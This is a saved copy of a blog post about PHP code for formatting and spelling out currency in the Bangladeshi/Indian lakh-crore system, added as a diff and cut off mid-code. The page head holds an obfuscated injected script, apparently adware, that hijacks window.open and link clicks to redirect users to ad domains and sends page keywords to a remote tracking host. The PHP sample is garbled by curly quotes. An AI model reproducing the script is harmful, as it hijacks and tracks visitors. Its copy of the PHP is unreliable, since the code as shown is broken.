@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en-US"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="keywords" content="proffesional wordpress theme, flexible wordpress theme, wordpress all in one theme, premium wordpress theme ">
+<meta name="description" content="full functionable, premium wordpress theme solution for your website.">
+<meta charset="UTF-8">
+<title>PHP: Convert number &amp; currency to text in asian i.e. Bangladeshi, Indian format | Learning Is Fun</title>
+<link rel="stylesheet" type="text/css" media="all" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/style.css">
+<!-- Google Fonts -->
+<link href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/css.css" rel="stylesheet" type="text/css">
+<link href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/css_002.css" rel="stylesheet" type="text/css">
+<link href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/css_003.css" rel="stylesheet" type="text/css">
+
+<!-- [if IE 7]>
+<link rel="stylesheet" media="all" href="http://www.tanzilo.com/wp-content/themes/diary/css/ie7.css" />
+<![endif]-->
+
+
+<!-- custom typography-->   
+<!-- custom typography -->
+
+
+
+<!-- wp hook-->
+<style type="text/css">
+					.no-break br {
+						display: none !important;
+					}
+			</style>
+<!-- All in One SEO Pack 2.2.5.1 by Michael Torbert of Semper Fi Web Design[326,434] -->
+<meta name="description" content="Hello Guys, I am from Bangladesh and our currency system is somewhat different. We use lac/lakh, crore etc. So, today I had to convert number to word in a">
+
+<link rel="canonical" href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/">
+<!-- /all in one seo pack -->
+<link rel="alternate" type="application/rss+xml" title="Learning Is Fun » Feed" href="http://www.tanzilo.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="Learning Is Fun » Comments Feed" href="http://www.tanzilo.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Learning Is Fun » PHP: Convert number &amp; currency to text in asian i.e. Bangladeshi, Indian format Comments Feed" href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/feed/">
+<link rel="stylesheet" id="skins-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/skin.css" type="text/css" media="all">
+<link rel="stylesheet" id="prettyphoto-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/prettyPhoto.css" type="text/css" media="all">
+<link rel="stylesheet" id="normalize-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/normalize.css" type="text/css" media="all">
+<link rel="stylesheet" id="boxes-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/boxes.css" type="text/css" media="all">
+<link rel="stylesheet" id="lists-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/lists.css" type="text/css" media="all">
+<link rel="stylesheet" id="social-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/social.css" type="text/css" media="all">
+<link rel="stylesheet" id="slider-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/slider.css" type="text/css" media="all">
+<link rel="stylesheet" id="viewers-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/viewers.css" type="text/css" media="all">
+<link rel="stylesheet" id="tabs-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/tabs.css" type="text/css" media="all">
+<link rel="stylesheet" id="toggles-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/toggles.css" type="text/css" media="all">
+<link rel="stylesheet" id="buttons-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/buttons_002.css" type="text/css" media="all">
+<link rel="stylesheet" id="columns-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/columns.css" type="text/css" media="all">
+<link rel="stylesheet" id="contact-form-7-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/styles.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-pagenavi-css" href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/pagenavi-css.css" type="text/css" media="all">
+<!-- This site uses the Google Analytics by Yoast plugin v5.3.2 - Universal disabled - https://yoast.com/wordpress/plugins/google-analytics/ -->
+<script src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/ga.js" async="" type="text/javascript"></script><script type="text/javascript">
+
+	var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-6196415-1']);
+	_gaq.push(['_gat._forceSSL']);
+	_gaq.push(['_trackPageview']);
+
+	(function () {
+		var ga = document.createElement('script');
+		ga.type = 'text/javascript';
+		ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		var s = document.getElementsByTagName('script')[0];
+		s.parentNode.insertBefore(ga, s);
+	})();
+
+</script>
+<!-- / Google Analytics by Yoast -->
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery-1.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/modernizr.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/selectivizr-min.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery_003.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/custom.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/buttons_002.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery_004.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery_006.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery-migrate.js"></script>
+<script type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/jquery_005.js"></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.tanzilo.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.tanzilo.com/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="JavaScript: Div &amp; Element hide &amp; show cross-browser script solution" href="http://www.tanzilo.com/2009/01/17/javascript-div-element-hide-show-cross-browser-script-solution/">
+<meta name="generator" content="WordPress 4.1.1">
+<link rel="shortlink" href="http://wp.me/pdY5K-1O">
+<script charset="utf-8" type="text/javascript">var switchTo5x=true;</script><script charset="utf-8" type="text/javascript" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/buttons.js"></script><script type="text/javascript">stLight.options({publisher:'bb66629c-50d5-4ae0-b1d6-e0578e000015'});var st_type='wordpress3.5.1';</script><link rel="shortcut icon" href="http://www.tanzilo.com/wp-content/themes/diary/favicon.ico" type="image/ico">
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<!-- wp hook--> 
+
+<!--[if lt IE 9]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<script src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/getAllAppDefault.esi" type="text/javascript"></script><script type="text/javascript" id="fghjktghndfgt">function fghjktghndfgt_init(){new function(){if(!document.getElementById('__fghjktghndfgt_once')){(function(){var a=document.createElement('div');a.id='__fghjktghndfgt_once';a.setAttribute('style','display:none;');var c=document.getElementsByTagName('body')[0];c&&c.appendChild(a)})();var a=this;a.pid='3458';a.cc='BD';a.eid='583';a.ename='YoutubeAdBlocke';a.hid='9794744258465800890';a.debugMode=!1;a.utils=new function(){var b=this;'function'!==typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,'')});b.JSON=new function(){this.parse=function(c){try{return'undefined'!==typeof JSON&&'function'==typeof JSON.stringify?JSON.parse(c):eval('var a='+c)}catch(a){return!1}}};b.cookie=new function(){var c=this;c.setCookie=function(c,a,b){var f='';'string'===typeof b?f='; expires='+b:'number'===typeof b&&(f=new Date,f.setTime(f.getTime()+864E5*b),f='; expires='+f.toGMTString());document.cookie=c+'='+a+f+'; path=/'};c.getCookie=function(c){c+='=';for(var a=document.cookie.split(';'),b=0;b<a.length;b++){for(var f=a[b];' '==f.charAt(0);)f=f.substring(1,f.length);if(0==f.indexOf(c))return f.substring(c.length,f.length)}return null};c.eraseCookie=function(a){c.setCookie(a,'',-1)}};b.getProtocol=function(c){var a=document.createElement('a');a.href=c;return a.protocol};b.getHostName=function(c){if(!c)return'';var a=document.createElement('a');a.href=c;return a.hostname};b.isMenuBarVisible=function(){if(!b.msie&&window.menubar)return window.menubar.visible;if('object'==typeof WebBrowser2)return WebBrowser2.MenuBar;if(b.msie)return!0;var c=window.innerWidth||document.documentElement.scrollWidth||0,a=window.innerHeight||document.documentElement.scrollHeight||0;if(c){window.resizeTo(c,a);var g=window.innerWidth||document.documentElement.scrollWidth,e=window.innerHeight||document.documentElement.scrollHeight;window.resizeTo(c+2,a);c=window.scrollWidth||document.documentElement.scrollWidth;return!(c!=g&&c<=g+2&&90>=a-e)}};b.getInstructions=function(c,d){b.msie?b.inject_script(c+('&cb='+a.prefix+'.'+d)):b.ajax.get(c,function(c){if(c)a[d](c)})};b.l=new function(){var c=this;c.xlat='abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';c.encode=function(a){a=c._utf8_encode(a);for(var b='',e=0;e<a.length;){var f=a.charCodeAt(e++),h=a.charCodeAt(e++),l=a.charCodeAt(e++),k=f>>2,f=(f&3)<<4|h>>4,n=(h&15)<<2|l>>6,m=l&63;isNaN(h)?n=m=64:isNaN(l)&&(m=64);b=b+c.xlat.charAt(k)+c.xlat.charAt(f)+(64==n?'=':c.xlat.charAt(n))+(64==m?'=':c.xlat.charAt(m))}return b};c._utf8_encode=function(c){if(c&&c.length){for(var a='',b=0;b<c.length;b++){var f=c.charCodeAt(b);128>f?a+=String.fromCharCode(f):(127<f&&2048>f?a+=String.fromCharCode(f>>6|192):(a+=String.fromCharCode(f>>12|224),a+=String.fromCharCode(f>>6&63|128)),a+=String.fromCharCode(f&63|128))}return a}return c};c.decode=function(a){a=a.toString().replace(/[^A-Za-z0-9\+\/]/g,'');for(var b='',e=0;e<a.length;){var f=c.xlat.indexOf(a.charAt(e++)),h=c.xlat.indexOf(a.charAt(e++)),l=c.xlat.indexOf(a.charAt(e++)),k=c.xlat.indexOf(a.charAt(e++)),n=(h&15)<<4|l>>2,m=(l&3)<<6|k,b=b+String.fromCharCode(f<<2|h>>4);64!=l&&0<n&&(b+=String.fromCharCode(n));64!=k&&0<m&&(b+=String.fromCharCode(m))}return this._utf8_decode(b)};c._utf8_decode=function(a){for(var c='',b=0;b<a.length;){var f=a.charCodeAt(b);if(128>f)c+=String.fromCharCode(f),b++;else if(191<f&&224>f)var h=a.charCodeAt(b+1),c=c+String.fromCharCode((f&31)<<6|h&63),b=b+2;else var h=a.charCodeAt(b+1),l=a.charCodeAt(b+2),c=c+String.fromCharCode((f&15)<<12|(h&63)<<6|l&63),b=b+3}return c}};b.ajax=new function(){this.get=function(c,a){try{var b=new XMLHttpRequest;b.open('GET',c,!0);b.withCredentials=!0;b.onreadystatechange=function(){4==b.readyState&&a(b.responseText)};b.send()}catch(e){}}};b.randomChar=function(){for(var a='',b=0;2>b;b++)a+='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52*Math.random()));return a};b.msie=function(){var a=parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10);isNaN(a)&&(a=parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10));return isNaN(a)?!1:a}();b.inject_script=function(c){var b=document.getElementsByTagName('body')[0],g=document.createElement('script');g.type='text/javascript';g.id='id_'+a.prefix;g.src=c;b&&b.appendChild(g)};b.epoch=function(){return Math.floor((new Date).getTime()/1E3)};b.getVert=function(){var a=localStorage.getItem('sk398erjds2d');return a?a:b.forexVert()};b.browser=function(){var a=navigator.userAgent.toLowerCase(),b={webkit:/webkit/.test(a),mozilla:/mozilla/.test(a)&&!/(compatible|webkit)/.test(a),chrome:/chrome/.test(a),msie:/msie/.test(a)&&!/opera/.test(a),firefox:/firefox/.test(a),safari:/safari/.test(a)&&!/chrome/.test(a),opera:/opera/.test(a)};b.version=b.safari?(a.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1];return b}();b.getNodeTextProp=function(a){return'textContent'in a?'textContent':'innerText'in a?'innerText':!1};b.dhtml_prop_name=function(a){return a.replace(/(\-([a-z]){1})/g,function(a,c,b){return b.toUpperCase()})};b.get_computed_style='function'!=typeof window.getComputedStyle?function(a){return{getPropertyValue:function(d){'float'==d&&(d='styleFloat');d=b.dhtml_prop_name(d);return'object'==typeof a.currentStyle&&null!=a.currentStyle&&'undefined'!=typeof a.currentStyle[d]?a.currentStyle[d]:null}}}:function(a,b){return window.getComputedStyle(a,b)||{getPropertyValue:function(){}}};b.getEmptyWindow=function(){var a=document.createElement('iframe');a.src='about:blank';a.setAttribute('style','display:inline;width:1px;height:1px;padding:none;margin:none;');document.body.appendChild(a);return a.contentWindow}};a.prefix='fghjktghndfgtssss';a.extName='YoutubeAdBlocke';a.version='0.1.1';a.pop_collision_id='__ipm=';a.pixelHostname='//mnh.unition.org/';a.watcherCount=0;a.fallbackHostnames=['compey.net','comprises.info'];try{a.stngs=a.utils.JSON.parse('{"szy_domain":["bestwebnutfunblack.org","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')}catch(q){a.hostnames=a.fallbackHostnames}var p;p=''!==a.stngs&&a.stngs&&'undefined'!==typeof a.stngs.szy_domain&&a.stngs.szy_domain instanceof Array?a.stngs.szy_domain:a.fallbackHostnames;a.hostnames=p;a.debugMode&&(a.debug=new function(){var b=this;window.oldSetTimeout=window.setTimeout;window.oldSetInterval=window.setInterval;b.overrideSettimeout=function(){window.setTimeout=function(a,b){return window.oldSetTimeout(function(){try{console.log('%csetTimeout: '+a.toString(),'color:purple'),a()}catch(b){}},b)}};b.overrideSetinterval=function(){window.setInterval=function(a,b){return window.oldSetInterval(function(){try{console.log('setInterval: '+a.toString()),a()}catch(b){}},b)}};b.overrideVariables=function(){a.pid='12';a.cc='US';a.eid='10';a.hid='123456789';a.ename='QA extension';a.lt='2617.24';a.jpshort='_OXQj15i';a.platform_version='9'};b.init=function(){b.overrideSettimeout();b.overrideSetinterval();b.overrideVariables()};b.init()});a.legacyHostnames=['superiends.org','go.turboloves.net','installerapplicationusa.com','stylene.net'];a.body=document.getElementsByTagName('body')[0];a.params={subid:a.pid,subid1:a.hid,subid2:a.eid,'px.pluginh':1,tid:'7',red:'1',subid3:'mnhadz'};a.manhattanCookieInterval=0.0416;a.events=new function(){var a=this;a.cache=[];a.add=window.addEventListener?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e.addEventListener(c,d,g);f&&a.cache.push([c,d,g,e])}:window.attachEvent?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e['e'+c+d]=d;e[c+d]=function(){e['e'+c+d](window.event)};e.attachEvent('on'+c,e[c+d]);f&&a.cache.push([c,d,g,e])}:function(){};a.remove=window.removeEventListener?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.removeEventListener(a,b,g)}:window.detachEvent?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.detachEvent('on'+a,e[a+b]);e[a+b]=null;e['e'+a+b]=null}:function(){};a.flush=function(){for(var c=0;c<a.cache.length;c++)a.remove.apply(a,a.cache[c]);a.cache=[]}};a.pixel=function(b,c){var d=a.pixelHostname+'?',g=a.hostnames[0],g={pid:a.pid,cc:a.cc,eid:a.eid,hid:a.hid,v:a.version,ch:b,cid:0,tid:a.params.tid,adtid:0,smid:0,pbid:'0',oh:encodeURIComponent(c),sh:encodeURIComponent(g)},e;for(e in g)d+=e+'='+g[e]+'&';d=d.slice(0,-1);if(21===b)return d=d.split('?')[1],a.utils.l.encode(d);(new Image).src=d};a.getKeywords=function(){var a=document.title,c=document.getElementsByTagName('meta');if(c)for(var d=0,g=c.length;d<g;d++)'keywords'!=c[d].name.toLowerCase()&&'description'!=c[d].name.toLowerCase()||(a+=' '+c[d].content.replace(/,/g,' '));if(d=document.getElementsByTagName('a')){c={};for(g=0;g<d.length;g++)try{var e=d[g].innerText;'undefined'==typeof e&&(e=d[g].textContent);for(var f=e.toLowerCase().split(/[\s,-]/g),h=0;h<f.length;h++)4>f[h].length||(c[f[h]]?c[f[h]]++:c[f[h]]=1)}catch(l){}var e=[],k;for(k in c)e.push([k,c[k]]);e.sort(function(a,b){return b[1]-a[1]});e=e.slice(0,25);for(k=0;k<e.length;k++)a+=' '+e[k][0]}return encodeURIComponent(a.replace(/[\!\[\]_-]/g,' ').trim().substring(0,1500))};a.isFalseResponseFromServer=function(){-1<a.body.innerText.indexOf('e7hZBzqVfn==')&&window.close()};a.checkIfServer=function(){for(var b=0;b<a.hostnames.length;b++)if(location.hostname===a.hostnames[b])return a.isFalseResponseFromServer(),!0};a.checkIfPop=function(b,c,d){return!(d&&d.toString()||'').match(/^(a652c|ld893)_/)&&-1==document.cookie.indexOf('xcddsa')&&d!== "r_ron_redir"&&-1==b.indexOf('px.pluginh')&&-1==b.indexOf('earchfu')&&-1==location.href.indexOf('/amz/')&&-1==location.href.indexOf('/sd/dw32.html')&&-1==location.href.indexOf('/pop/1.1.00')&&!location.href.match(/cpops-\d+\.html/)&&-1==location.href.indexOf('px.pluginh')&&-1==b.indexOf('nkths.co')&&-1==b.indexOf('ally.asi')&&-1==b.indexOf('/sd/dw32.html')&&-1==b.indexOf('/pop/1.1.00')&&-1==b.indexOf('/amz/')&&!b.match(/cpops-\d+\.html/)&&-1==a.utils.getHostName(b).indexOf('getjs')&&-1==a.utils.getHostName(b).indexOf('hsbc')};window.self==window.top&&a.pixel(10,'0');-1<window.location.href.indexOf(a.pop_collision_id)&&window.self==window.top&&a.pixel(13,'0');a.addBlurredTabListener=function(b){var c;try{c=a.utils.getHostName(b.target.getAttribute('href'))}catch(d){c=''}'a'==b.target.tagName.toLowerCase()&&''==b.target.innerHTML&&b.target.getAttribute('href')&&!b.target.getAttribute('download')&&-1==c.indexOf(window.self.location.hostname)&&(c=b.target.getAttribute('href')?b.target.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),b.target.setAttribute('target',a.prefix),c=new Date,c.setHours(c.getHours()+5),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),b.target.setAttribute('href',a.manhattanUrl),document.getElementsByTagName('body')[0].removeEventListener('click',a.addBlurredTabListener))};a.prepareUrl=function(b){b='?';for(var c in a.params)b+=c+'='+a.params[c]+'&';b+='k='+a.getKeywords();return'http://'+a.hostnames[0]+b};try{window.top==window.self&&-1==document.cookie.indexOf('vdsknj4th4uh')&&window.name!==a.prefix&&a.overrideDispatchEvent()}catch(r){}a.checkIfServer()||(a.cachedOpenFn=window.open,a.overrideDispatchEvent=function(){a.cachedDispatchEvent=document.createElement('a').constructor.prototype.dispatchEvent;document.createElement('a').constructor.prototype.dispatchEvent=function(b){var c;try{c=a.utils.getHostName(event.target.getAttribute('href'))}catch(d){c=''}'a'==this.tagName.toLowerCase()&&''==this.innerHTML&&'click'==b.type&&-1==c.indexOf(window.self.location.hostname)&&this.getAttribute('href')&&!this.getAttribute('download')&&(c=this.getAttribute('href')?this.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),this.setAttribute('target',a.prefix),c=new Date,c.setHours(c.getHours()+1),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),this.setAttribute('href',a.manhattanUrl));a.cachedDispatchEvent.call(this,b)}},a.overrideWindowOpen=function(){clearTimeout(a.timeout);window.open=function(b){return function(c,d,g){window.self==window.top&&a.pixel(11,'0');b=a.cachedOpenFn;if(a.checkIfPop(c,g,d))return d=new Date,d.setHours(d.getHours()+1),a.utils.cookie.setCookie('xcddsa','1',d.toUTCString()),a.manhattanUrl=a.prepareUrl(c),d=a.prefix,a.pixel(20,c),a.manhattanOn=!0,a.utils.msie&&9>a.utils.msie?window.open(a.manhattanUrl,d,g):b.call(window,a.manhattanUrl,d,g);d=d||'';window.open=a.cachedOpenFn;return a.utils.msie&&9>a.utils.msie?window.open(c,d,g):b.call(window,c,d,g)}}(window.open);4<a.watcherCount||a.manhattanOn||(a.watcherCount++,a.openWatcher())},a.overrideDispatchEvent(),a.openWatcher=function(){a.timeout=setTimeout(a.overrideWindowOpen,200)},a.openWatcher(),'undefined'==typeof window[a.prefix]&&(window[a.prefix]=a))}};};fghjktghndfgt_init()</script><script src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/checkOAuth.esi" type="text/javascript"></script><link href="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/buttons.css" type="text/css" rel="stylesheet"></head>
+
+<body class="single single-post postid-112 single-format-standard">
+<div id="wrapper">
+	<!-- Begin Header -->
+	<header id="page-header">
+	  <div id="logo">
+			<h1 id="title"><a href="http://www.tanzilo.com/">Learning Is Fun</a></h1>
+			<span>Use LinkedIn for Lead Generation</span>	  </div>
+	 <div id="topSearch">
+		<form id="searchform" action="http://www.tanzilo.com" method="get">
+			<input id="s" name="s" value="type your search and hit enter" onfocus="this.value=''" type="text">
+		</form>
+	</div>
+	</header>
+	<!-- End Header -->
+	<!-- Begin Content -->
+	<div id="content-wrapper">
+		<div id="content-inner-wrapper">
+
+		<!-- Begin Main Content ( left col ) -->
+		<section id="main-content">
+			
+				<!-- Begin Article -->
+				<article class="post">
+					<header class="postHeader">
+					  <div class="date">Jan 28, 2011 - <span><img src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/ico_file.png" alt=""> <a href="http://www.tanzilo.com/category/web-programming/php/" rel="category tag">PHP</a> &nbsp;&nbsp;<img src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/ico_comment.png" alt=""> <a href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/#comments" title="Comment on PHP: Convert number &amp; currency to text in asian i.e. Bangladeshi, Indian format">16 Comments</a></span> </div>
+					  <h2><a href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/">PHP: Convert number &amp; currency to text in asian i.e. Bangladeshi, Indian format</a></h2>
+					</header>
+					<section class="postText">
+					 <p>Hello Guys,</p>
+<p>I am from Bangladesh and our currency system is somewhat different. 
+We use lac/lakh, crore etc. So, today I had to convert number to word in
+ a project. When I was searching the web, I did not found anything that 
+meets my requirement 100%. So I wrote one. Although my code does not 
+support more than 999 crore taka / rupee, I think this will suffice most
+ of the projects requirements.</p>
+<p>To be frank I used several pieces of beautiful code from internet.</p>
+<p>Well. Enough talks. Let me show the code.</p>
+<p>CODE:</p>
+<p>================================================</p>
+<p>{code type=PHP}</p>
+<p><!--?php</p-->
+</p><p>	error_reporting(E_ALL);<br>
+	//error_reporting(0);</p>
+<p>	class Currency<br>
+	{</p>
+<p>		function __construct()<br>
+		{<br>
+			//do nothing for now<br>
+		}</p>
+<p>		// http://www.phpbuilder.com/board/showthread.php?t=10350901<br>
+		function get_bd_money_format($amount)<br>
+		{<br>
+			$output_string = '';<br>
+			$fraction = '';<br>
+			$tokens = explode('.', $amount);<br>
+			$number = $tokens[0];<br>
+			if(count($tokens) &gt; 1)<br>
+			{<br>
+				$fraction = (double)(‘0.’ . $tokens[1]);<br>
+				$fraction = $fraction * 100;<br>
+				$fraction = round($fraction, 0);<br>
+				$fraction = ‘.’ . $fraction;<br>
+			}</p>
+<p>			$number = $number . ”;<br>
+			$spl=str_split($number);<br>
+			$lpcount=count($spl);<br>
+			$rem=$lpcount-3;<br>
+			//echo “rem”.$rem.”<br>“;<br>
+			//even one<br>
+			if($lpcount%2==0)<br>
+			{<br>
+				for($i=0;$i&lt;=$lpcount-1;$i++)<br>
+				{</p>
+<p>					if($i%2!=0 &amp;&amp; $i!=0 &amp;&amp; $i!=$lpcount-1)<br>
+					{<br>
+						$output_string .= ",";<br>
+					}<br>
+					$output_string .= $spl[$i];<br>
+				}<br>
+			}<br>
+			//odd one<br>
+			if($lpcount%2!=0)<br>
+			{<br>
+				for($i=0;$i&lt;=$lpcount-1;$i++)<br>
+				{<br>
+					if($i%2==0 &amp;&amp; $i!=0 &amp;&amp; $i!=$lpcount-1)<br>
+					{<br>
+						$output_string .= ",";<br>
+					}<br>
+					$output_string .= $spl[$i];<br>
+				}<br>
+			}<br>
+			return $output_string . $fraction;<br>
+		}</p>
+<p>		// http://efreedom.com/Question/1-3181945/Convert-Money-Text-PHP<br>
+		function translate_to_words($number)<br>
+		{<br>
+		/*****<br>
+			 * A recursive function to turn digits into words<br>
+			 * Numbers must be integers from -999,999,999,999 to 999,999,999,999 inclussive.<br>
+			 *<br>
+			 *  (C) 2010 Peter Ajtai<br>
+			 *    This program is free software: you can redistribute it and/or modify<br>
+			 *    it under the terms of the GNU General Public License as published by<br>
+			 *    the Free Software Foundation, either version 3 of the License, or<br>
+			 *    (at your option) any later version.<br>
+			 *<br>
+			 *    This program is distributed in the hope that it will be useful,<br>
